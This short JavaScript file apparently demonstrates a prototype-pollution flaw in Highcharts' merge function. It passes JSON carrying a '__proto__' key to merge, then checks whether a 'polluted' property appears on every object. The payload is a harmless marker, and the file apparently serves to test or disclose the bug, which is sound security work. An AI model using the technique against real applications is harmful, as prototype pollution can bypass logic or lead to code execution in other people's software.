const Highcharts = require("highcharts");

let obj = JSON.parse('{"__proto__" :{"polluted":"yes"}}');
Highcharts.merge({}, obj);
console.log({}.polluted);
